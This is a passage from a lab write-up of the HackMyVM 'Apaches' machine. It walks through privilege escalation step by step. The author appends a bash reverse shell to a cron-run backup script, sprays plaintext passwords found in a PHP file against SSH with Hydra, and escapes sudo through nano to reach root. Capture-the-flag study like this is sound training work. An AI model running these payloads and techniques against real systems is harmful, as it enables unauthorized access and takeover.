@@@@@@@@@&&&&&&&@&&&&&&&&&&//*(&&%%#/#%&&//**(//(//  .&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@@@@&@&&&&&&&&&&(,,*&@&&&&&%%&&(/,((((//(   /&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@&&&&&&&&&&&&&&&&&(.  ##%&&/&&(#*,. /,/////   &&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@&&&&&&&&&&&&&&&&&,  %##%%&&&/**.,**//(///,#&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@&&@&&&&&&&&&&&&&&(,/%%%&&&&&%((**//*/(/  /&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@&&@@@&@&&&&&&&&&&&&%*,.#%#&&&#*////**.     .%&&&&&&&&&&&&&&&&&&&@&&&&&
@@@@@@@@@@@&@&@&@&&&&&&&&&&%#&** /%#/*,(..,..       ...*&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@&@@@&@@&&&&&&&&@@&#/.**%&%##(*,.    ..   .,//&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@&@&@&@&@@&&@@&&@&&&%( %%(&%&%#((%%**@*,.,.,,//,&&&&&&@&&@&&&&&&&&&&&&&&

Well done!
```
The other interesting file is the `todo.md`. this is probably a task list of the user
```bash
squanto@apaches:~$ cat todo.md 
### Development

- [x] Apaches frontpage
- [ ] Portal for administration
- [ ] Database selection for administration
- [ ] Hardening the system for attacks
squanto@apaches:~$ 

```
There are some items they have to develop and configure yet. Let's continue with our enumerating.
What would be in the backup directory?
```bash
squanto@apaches:~$ ls -la backup/
total 8
drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 .
drwxr-xr-x 5 squanto squanto 4096 Dec 25 12:12 ..

```
Nothing is found here. We should continue enumerating. The backup directory is still bothering me. We should try to see if there is a cronjob that creates a backup.
```bash
squanto@apaches:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

#* 5 * * * * su sacagawea -c "./home/sacagawea/Scripts/backup.sh"

```
Based on this information we can see that `sacagawea` is executing a bash script that probably does something with a backup. We should inspect that file for permissions and content.
```bash
squanto@apaches:~$ cat /home/sacagawea/Scripts/backup.sh
#!/bin/bash

rm -rf /home/sacagawea/Backup/Backup.tar.gz
tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
chmod 700 /home/sacagawea/Backup/Backup.tar.gz
squanto@apaches:~$ ls -la /home/sacagawea/Scripts/backup.sh
-rwxrwx--- 1 sacagawea Lipan 182 Oct 10  2022 /home/sacagawea/Scripts/backup.sh

```
It looks like the bash script is creating an archive of the website. The bash script can be adjusted and executed by members of the lipan group. Since no one else can read the file we are probably member of the lipan group. We can check this with `id`.

```bash
squanto@apaches:~$ id
uid=1001(squanto) gid=1001(squanto) groups=1001(squanto),1004(Lipan)

```
So every 5 minutes there is an backup created. If we change the bash script we might be able to get a reverse shell. We should start a new netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ rlwrap nc -lvp 1234          
listening on [any] 1234 ...

```
Next we should append the backup bash script.
```bash
squanto@apaches:~$ echo '/bin/bash -i >& /dev/tcp/10.0.2.15/1234 0>&1' >> /home/sacagawea/Scripts/backup.sh

```
After a few minutes we get a reverse shell.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ rlwrap nc -lvp 1234          
listening on [any] 1234 ...
10.0.2.32: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.32] 41498
bash: cannot set terminal process group (46114): Inappropriate ioctl for device
bash: no job control in this shell
sacagawea@apaches:~$ 

```
Again we should start enumerating the home directory.
```bash
sacagawea@apaches:~$ ls -la
ls -la
total 48
drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13 17:46 .
drwxr-xr-x 6 root      root      4096 Oct  9  2022 ..
drwxrwxr-x 2 sacagawea sacagawea 4096 Dec 25 13:16 Backup
-rw------- 1 sacagawea sacagawea    0 Oct 10  2022 .bash_history
-rw-r--r-- 1 sacagawea sacagawea  220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 sacagawea sacagawea 3771 Oct  9  2022 .bashrc
drwxrwxr-x 7 sacagawea sacagawea 4096 Oct 10  2022 Development
drwxrwxr-x 3 sacagawea sacagawea 4096 Oct 10  2022 .local
-rw-r--r-- 1 sacagawea sacagawea  807 Oct  9  2022 .profile
drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 Scripts
-rw-rw-r-- 1 sacagawea sacagawea   66 Oct 10  2022 .selected_editor
-rw-rw---- 1 sacagawea sacagawea 5899 Jul 13 17:46 user.txt
sacagawea@apaches:~$ 
```

First we will capture the user flag.
```bash
cat user.txt
```
![image](/assets/img/WriteUp/HackMyVM/Apaches/Pasted image 20231225141808.png){: width="700" height="400" }

In the home directory, there was a directory named `development`. This name sounds interesting in combination with the `todo.md` we saw earlier. We should see what files are stored in this directory.
```bash
sacagawea@apaches:~$ ls -la Development
ls -la Development
total 68
drwxrwxr-x 7 sacagawea sacagawea  4096 Oct 10  2022 .
drwxr-xr-x 6 sacagawea sacagawea  4096 Jul 13 17:46 ..
drwx------ 2 sacagawea sacagawea  4096 Oct  6  2022 admin
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 css
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 fonts
drwxrwxr-x 4 sacagawea sacagawea  4096 Oct 10  2022 images
-rwxrwxr-x 1 sacagawea sacagawea 33940 Oct 10  2022 index.html
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 js
-rwxrwxr-x 1 sacagawea sacagawea   116 Oct 10  2022 robots.txt
sacagawea@apaches:~$ 

```
It looks like there is an admin directory. Let's find out what we can discover here.
```bash
sacagawea@apaches:~$ ls -la Development/admin
ls -la Development/admin
total 24
drwx------ 2 sacagawea sacagawea 4096 Oct  6  2022 .
drwxrwxr-x 7 sacagawea sacagawea 4096 Oct 10  2022 ..
-rwx------ 1 sacagawea sacagawea  689 Oct  6  2022 1a-login.php
-rwx------ 1 sacagawea sacagawea  724 Oct 24  2020 1b-login.css
-rwx------ 1 sacagawea sacagawea  773 Oct 10  2022 2-check.php
-rwx------ 1 sacagawea sacagawea  267 Nov  5  2021 3-protect.php
sacagawea@apaches:~$ 

```
The file `2-check.php` sounds interesting. So we should inspect the content of this PHP file.
```bash
cat Development/admin/2-check.php
<?php
// (A) START SESSION
session_start();

// (B) HANDLE LOGIN
if (isset($_POST["user"]) && !isset($_SESSION["user"])) {
  // (B1) USERS & PASSWORDS - SET YOUR OWN !
  $users = [
    "geronimo" => "12u7D9@4IA9uBO4pX9#6jZ3456",
    "pocahontas" => "y2U1@8Ie&OHwd^Ww3uAl",
    "squanto" => "4Rl3^K8WDG@sG24Hq@ih",
    "sacagawea" => "cU21X8&uGswgYsL!raXC"
  ];

  // (B2) CHECK & VERIFY
  if (isset($users[$_POST["user"){: width="700" height="400" }
)) {
    if ($users[$_POST["user"){: width="700" height="400" }
 == $_POST["password"]) {
      $_SESSION["user"] = $_POST["user"];
    }
  }

  // (B3) FAILED LOGIN FLAG
  if (!isset($_SESSION["user"])) { $failed = true; }
}

// (C) REDIRECT USER TO HOME PAGE IF SIGNED IN
if (isset($_SESSION["user"])) {
  header("Location: index.php");
  exit();
}
sacagawea@apaches:~$ 

```

We discovered some plaintext passwords in this script. We should add them to our notes, as well we should create a username list as a password list file. Those lists we can use to spray the credentials against the SSH service with Hydra.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ cat users.txt    
geronimo
pocahontas
squanto
sacagawea                                                                               

┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ cat passwords.txt 
12u7D9@4IA9uBO4pX9#6jZ3456
y2U1@8Ie&OHwd^Ww3uAl
4Rl3^K8WDG@sG24Hq@ih
cU21X8&uGswgYsL!raXC 
```
After creating the lists in Kali, we can use them with Hydra.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ hydra ssh://$ip -L users.txt  -P passwords.txt
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-25 14:31:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://10.0.2.32:22/
[22][ssh] host: 10.0.2.32   login: pocahontas   password: y2U1@8Ie&OHwd^Ww3uAl
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-25 14:31:23

```
We have found credentials of pocahontas with Hydra. We should add them to our notes:
- Password: y2U1@8Ie&OHwd^Ww3uAl
- Username: pocahontas

We can now try to logon to the SSH service as pocahontas.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ ssh pocahontas@$ip            
                                                                                
                                                                                
                                                                                
                                                                  
                                                                        >>       >======>         >>           >=>    >=>    >=> >=======>   >=>>=>   
                                                                       >>=>      >=>    >=>      >>=>       >=>   >=> >=>    >=> >=>       >=>    >=> 
                                                                      >> >=>     >=>    >=>     >> >=>     >=>        >=>    >=> >=>        >=>       
                          ~                                          >=>  >=>    >======>      >=>  >=>    >=>        >=====>>=> >=====>      >=>     
                    7~   ~&.                                        >=====>>=>   >=>          >=====>>=>   >=>        >=>    >=> >=>             >=>  
                    G!J !75!   ~G     :                            >=>      >=>  >=>         >=>      >=>   >=>   >=> >=>    >=> >=>       >=>    >=> 
                   ?~:B!. 5Y^!~^B. :~J&                           >=>        >=> >=>        >=>        >=>    >===>   >=>    >=> >=======>   >=>>=>
                 .GG?~    B^...PB?!^ ?5 .                         
                7&G:  7. JB7?7^..   ^&P&Y .7#                     If at first you don't succeed. Try, try again! Sometimes the second time returns more!
              .GG.  ~J. ?@5:  :~.  Y@@@@??!?#                     
             :#~  ~Y~  JJ  :77: .J&@#57:  :&!.~Y  .:              
            :&. ^P7  ^J::!7^.:!YJ!:....  Y@@@@@&J5@!              
            @7 Y5  :GP77~::~!~...:^:..:J#&#GPJ!:.PG               
           P@~B# ^B@G~^^!!~^^^^:...^7J7.       ^BP^?:             
          ^@@@@@&@#~7G5J7~::.:^~?JJ7~::^^~~~?B@@@@@&              
          &J!7?P#@B@@@B!:!?77???7!~~!!?J5PPP5YJ??YPYJ~.           
         ?P       :?B@&#@#?7!^^~?55Y7^:..       .^?J5Y^           
         ?B^^^::..    ~G&@#YP#&@B!....::::^~75B&@@@@#G!           
         :&~J?P&@@G?7!^..BG!~7B@#5J7!!7?JPGBB#BB&&@@B^            
         !5 ##J?PY    :JP&    .@&G5JY5GG57^:...   .~YBJ           
        ~5  :P7!^ ..^   ~@P~~~BB7^:.  .:~5G! .:!5B&@G!!.          
       .P      ~PGB#5   P:5!B&7~:Y&#&B&&#GPY7!!?5B@@&G:           
       Y7   ^^ .5GGB!  5~!7:7!G:. 7B7?~^^?G#P!....:GP             
       .~^JJ^   .     .G #..J ##!  J#~..:.  .7P#?^:.              
          !Y:^. ?.    ~Y &  7 PJ!P7^@@&Y!^^.  .J&Y                
           P!         ~P @. : Y&  5GPJ#??~~?#G!!!7.               
           !?       ^?J&.#J   B##: .  B7:.   5^                   
            !!^.:!PP^  !G!&.  5^7?J   ?#:~~^.:B^                  
              .::..!?   .!JG. &^  BG~.:@       .                  
                    JG!!^..5YYG5^ &..~Y&                          
                   .G...^?~  .  JB!    .                          
                   .G!7!:                                   
                   
pocahontas@10.0.2.32's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 25 Dec 2023 01:32:46 PM UTC

  System load:  0.11               Processes:               136
  Usage of /:   22.6% of 39.07GB   Users logged in:         1
  Memory usage: 17%                IPv4 address for enp0s3: 10.0.2.32
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

143 updates can be installed immediately.
2 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


pocahontas@apaches:~$ 

```
We are pocahontas on the machine. We should start enumerating again. Yes this process is returning every time!
```bash
pocahontas@apaches:~$ whoami;id
pocahontas
uid=1003(pocahontas) gid=1003(pocahontas) groups=1003(pocahontas)
pocahontas@apaches:~$ ls -la
total 40
drwxr-xr-x 4 pocahontas pocahontas  4096 Dec 25 13:31 .
drwxr-xr-x 6 root       root        4096 Oct  9  2022 ..
-rw------- 1 pocahontas pocahontas     0 Oct 10  2022 .bash_history
-rw-r--r-- 1 pocahontas pocahontas   220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 pocahontas pocahontas  3771 Oct  9  2022 .bashrc
drwx------ 2 pocahontas pocahontas  4096 Dec 25 13:31 .cache
drwxrwxr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .local
-rw-r--r-- 1 pocahontas pocahontas   807 Oct  9  2022 .profile
-rw------- 1 pocahontas pocahontas 10267 Oct 10  2022 user.txt

```
Another user flag is shown. We should capture this file.
```bash
cat user.txt
```
![image](/assets/img/WriteUp/HackMyVM/Apaches/Pasted image 20231225143524.png){: width="700" height="400" }

Let's find out if we can sudo with this user.
```bash
pocahontas@apaches:~$ sudo -l
[sudo] password for pocahontas: 
Matching Defaults entries for pocahontas on apaches:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pocahontas may run the following commands on apaches:
    (geronimo) /bin/nano

```
We can sudo as geronimo `/bin/nano`. Let's find out how we can use this on [GTFObins](https://gtfobins.github.io/gtfobins/nano/#sudo).
It looks simple, so let's do it.
```bash
sudo -u geronimo /bin/nano
```
Followed by:
```bash
CTRL + R
```
Then
```bash
CTRL + X
```
And finally
```
reset; sh 1>&0 2>&0
```

![image](/assets/img/WriteUp/HackMyVM/Apaches/Pasted image 20231225144157.png){: width="700" height="400" }

An then hit `enter` on the keyboard. We should start enumerating directly.
```bash
geronimoelp                                                                   M-F New Buffer                                                                ^X Read File
$ lsancel                                                                     M-\ Pipe Text
user.txt
$ id
uid=1000(geronimo) gid=1000(geronimo) groups=1000(geronimo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
$ 

```
It looks like we are member of the sudoers group. We should try the command `sudo -l` to see if we can sudo without any password.
```bash
$ sudo -l
Matching Defaults entries for geronimo on apaches:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User geronimo may run the following commands on apaches:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
$ 
```

We can sudo anything, so we can run `sudo su` to switch the user to the root flag. Before doing this let's capture the flag in the home directory if there is any.

```bash
$ cd ~
$ ls -la
total 32
drwxr-xr-x 4 geronimo geronimo 4096 Jul 13 17:49 .
drwxr-xr-x 6 root     root     4096 Oct  9  2022 ..
-rw------- 1 geronimo geronimo    0 Jul 13 17:49 .bash_history
-rw-r--r-- 1 geronimo geronimo  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 geronimo geronimo 3771 Feb 25  2020 .bashrc
drwx------ 2 geronimo geronimo 4096 Sep 30  2022 .cache
drwxrwxr-x 3 geronimo geronimo 4096 Oct 10  2022 .local
-rw-r--r-- 1 geronimo geronimo  807 Feb 25  2020 .profile
-rw-r--r-- 1 geronimo geronimo    0 Oct  1  2022 .sudo_as_admin_successful
-rw------- 1 geronimo geronimo 3827 Oct 10  2022 user.txt
$ cat user.txt

  _____ _                      __                              _                 
 |  ___| | __ _  __ _    ___  / _|   __ _  ___ _ __ ___  _ __ (_)_ __ ___   ___  
 | |_  | |/ _` |/ _` |  / _ \| |_   / _` |/ _ \ '__/ _ \| '_ \| | '_ ` _ \ / _ \ 
 |  _| | | (_| | (_| | | (_) |  _| | (_| |  __/ | | (_) | | | | | | | | | | (_) |
 |_|   |_|\__,_|\__, |  \___/|_|    \__, |\___|_|  \___/|_| |_|_|_| |_| |_|\___/ 
                |___/               |___/                                        


%&&&&&&&&&&&&&&&&&&&&&&&&&%&&&&&&&&&&%%%&&&&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%###(((//////
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%%%%&%%%%%%%%&%%#(%%%%%%%%%%%%%%%%%%%%%%%##((((((///
%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%%%##%%%%%%%%(/**(%%#%%%%%%%%%%%%%%%%%%%%%%##(((((((//
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%%%%%%#*,/%%%%((((/%%%%*,/%%%%%%%%%%%%%%%%%%%##((((((/**
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%(%%////*%%#((##((%%#*/,,,#%%%%%%%%%%%%%%%%%#####((((//
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&%%%%#(%/*///*#(/((#(((%#*/,,,,#*,,(%%%%%%%%%%%%%%####((((((
%&&&&&&&&&&&&&&&&&&&&&&&&%&%%%%%%(%(##,,**/**#(((#%/(%*/*,,.,*/,.,%%%%%%%%%%#(%%####((((//
%&&&&&&&&&&&&&&&&&&&&&&&&&%%%&%%(#/(#/,***/**(#((((/%*/*.,,.,/,../%%%%%%############(((/(/
%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%((((/(#,***(*,(#((#(*,**...,,*,...%%.,,.#####%####%###(((/(
%&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&#((#/&#(/((#**/##(%/,,*....,,...,/..,...#%%%%###%#%%###((((
%&&&&&&&&&&&&&&&&&&&&&&&&&&&&%##((#(%#%%((%///##((/*/*..,,,,...,**,.......(#####%#%%###(((
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%#/#%(##%%#&#%///%#%(//,..,,,..*,.,,....,......,(##%%%%%##(((
%&&&&&&&&&&&&&&&&&&&&&&&&&&%%%((((%%(&%%&&&(%#%%%#%/#*#(/..........,.......#%%#########(((
&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%/#/#%%%%&&&%&%%#%%%#%#*(#%(,#*............./#*/##%#%%##(##((
&&&&&&&&&&&&&&&&&&&&&&&%&&&%%%#/##%%&&&%%%%%(/*#.*/,.,.#*(%/,,#...........(%%%%#####((((((
%&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%(/#&&%%/,(//,(*,/,/(.,,/..,*/(#(..#....../#%%%#######((((((
%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#*(%%&%,#/*((,(//,//***(..*..,,#*#(((*..((.,%%%%###(((((((((
%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%%(%&(%/#/,%%%%%%%%%#%#(#/*,..#.,*///....*###(#######((((((#
%&&&&&&&&&&&&&&&&&&&&&&&&&&%%%%%%%%/(%%%%../###((*#/.....,,,../(***.((##((((((###(((((((((
%%&&&&&&&&&&&&&&&&&&&&&&&&%&&%%%%%%%#..*,((,/..../..........**(//,./##%%#####((/(((//((###
%%&&&&&&&&&&&&&&&&&&&&&&&%%%&%%%%%%/,.,,##(%#,,,(#,.,...,...,**///*(###%%##(((((((//*/(#((
#%%%%&&&&&&&&&&&&&&&&&&%&%%%%%%%%%(,..,,(%%((#%%%#,..,/*,....,.......(#######(((////((##((
%%%%%%%&&&&&&&&&&&&&&&&&%%%%%%%%%#(..*..,,,/*..,/*....,.....,,/##/,../####((((((/////((##(
%%%%%%%%%%&&&&&&&&&&%%%%&%%%%%%%%##.....**(/*(#(/,..........,*,(%%######(((///((////((##(/
%%%%%%%%%&%&&%&&&&%&&&%%%%%%%%%%%%#,..//,//(*##((*........../,#/(%%%#%##///////////((##((/
%%%%%%%%&%&&&&&%&&%&&%&%%%%%%%%%##,#......*,*/((/,.........,(,.(/##%%%#((//*///////((##(//
%%%%%%%%%&&&&%%%&&&%%%%%%%%%%%%#(/(%**((....*(.............*#*,/((#####(/////////((####(//
%%%%%%%%%%%%%%&%%&&&%%%#%(#%%%#(((#%/./..,.#/.(/(..,*,.....(#/...,,*((#((//*/////((###(///
#%%%%%%%%%%%%&&%%%%%*%%#&*#%%%(//#%%...#,,*/**,,,...(((,..,#/(.,,**//*/,/////////((###(///
(#%%%%%%%%%%%%%%%%%&(*#((/(((/*,#%%#.,.,,%//((%#/,......,#%#((.,*///(//((////////(((((///(
(##%#%%%%%%%%%%##%%%%/,%(/,(*,,,%%#%#..,**/((/(*,,...,,,,,,(#(,,**(((((((/((////((((((/*((
*(#%##%%%%%%%%%##%((%(.*%**/(..(%%%%#..,*(//(/*,,,...,.,,,*%(((***/(((#%(,(/##(((((((////(
/(###%%%%%%%%%###*#%%#(/#,#,,((%%%%%#/..*/////*,*,..,,,,,**####/*/(((%##(*(#%,((/((/////(#
/(##%%#%%%%%%#%,(%%%##(,//,*(*/%&%%/%#..*/**//*,*,,,,,,,,,/(%%%//((%,/%%%/,,/#(((/(////#((
*#(#(#####%#%#/*%%%%(**(/*(*((%&%%%%%#.,*(/***,,**,/,,,**(/*/(#*%/*,%%(((//(%#%#%(////(#((
*##((#######%(*####.*(///,(*/,&%%%%%%#.,,,**%,***%/,,/.**,*#%%(%(*/,*,/%#,(%%%%%((///((#((

As long as you keep going, you'll keep getting better.

```

## Privilege escalation
Now let's switch to the root user.
```bash
$ cat user.txt
root@apaches:/home/geronimo#
```
We are root now, we should capture the root flag!
```bash

root@apaches:/home/geronimo# cd ~
root@apaches:~# cat root.txt


         █████╗ ██████╗  █████╗  ██████╗██╗  ██╗███████╗███████╗
        ██╔══██╗██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔════╝
        ███████║██████╔╝███████║██║     ███████║█████╗  ███████╗
        ██╔══██║██╔═══╝ ██╔══██║██║     ██╔══██║██╔══╝  ╚════██║
        ██║  ██║██║     ██║  ██║╚██████╗██║  ██║███████╗███████║
        ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝
                                                        

                                                                                
            ............                                                        
                 ........,,,,,,,                                                
                      ....,,,,.......                                           
                            .............                                       
                                 ............                                   
     .................,,,,,,,,....     ........                                 
                , ,,,,,,,,,,,,............ .......                              
                                     .........  ....                            
                                    ..................                          
                                ,,....................                          
                              *,,,,,,,,,,,,,,,,,,,,,,.                          
                             ***,,,,,,,,,,,,,,,,,,,,,.........                  
                            *****,,,,,,,,,,,,,,,,,,,.......,,,,,                
                           /////**,,,,,,,,,,,,,,,,,,......,,,,,,.               
                           ////////,******,,,,,,,,,......,,,,,,,,               
                          ///////////*************.,,,,,,,,,,,,,                
                          ////////////*********,,,....,,,,,,,,,,,               
                           /////////////***,,,,,,........,,,,,,....             
                          ./////******,,,,,,,,,,.....,......,,......            
                          **********,,,,,,,,,,,,...,,,,.....,,........          
                          *******,,,,,,,,,,,,,,..,,,,,,,.,,,,,,,.               
                         ******,,,,,,,,,,,,,,,,,........,,,,,,,,,               
                        ,****,,,,,,,,,,,,,,,,,,,,.......,,,,..,,,               
                       ***,,,,,,,,,,,,,,,,,,,,,,,,.....,,......                 
                     ***,...,,,,,,,,,,,,,,,,,,,,,,,.............                
                        ((,,,,,,,,,,,,,,,,,,,,,,,,,.                            
                      *((((((((,,,,,,,,,,,,,,,,,,,,                             
                                       ,,,,,,,,,,,                              
                                          /,,,,..                               
                                              ,...                              
                                                 ,.                             



                Awesome, you have captured the root flag!!!!!

Flag: HERE IS THE ROOT FLAG

```



